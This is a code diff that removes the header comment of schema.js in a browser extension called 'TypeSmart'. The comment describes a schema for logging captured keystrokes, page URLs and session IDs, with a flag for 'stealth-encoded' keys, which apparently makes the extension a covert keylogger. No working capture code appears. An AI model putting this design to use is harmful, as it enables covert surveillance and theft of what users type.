@@ -1,30 +1,3 @@
-/**
- * ============================================================================
- * TypeSmart — Shared Data Contract (schema.js)
- * ============================================================================
- *
- * PURPOSE:
- *   Defines the universal storage schema and helper functions used by every
- *   module in the TypeSmart extension. ALL members import from this file —
- *   it is the single source of truth for data shape and serialisation.
- *
- * SCHEMA:
- *   Each logged entry conforms to this shape:
- *   {
- *     url:        String  — the page URL where keys were captured
- *     timestamp:  Number  — Unix epoch ms when the entry was created
- *     keys:       String  — captured keystroke sequence
- *     sessionId:  String  — unique session identifier (UUID-v4-like)
- *     obfuscated: Boolean — whether `keys` has been stealth-encoded
- *   }
- *
- * USAGE:
- *   • ES module:   import { createEntry, serializeEntry, ... } from './schema.js';
- *   • Content script (no module support): access via window.Schema global.
- *
- * DO NOT EDIT — this file is owned by the shared contract.
- * ============================================================================
- */
 
 (function (root, factory) {
   // Universal Module Definition (UMD)
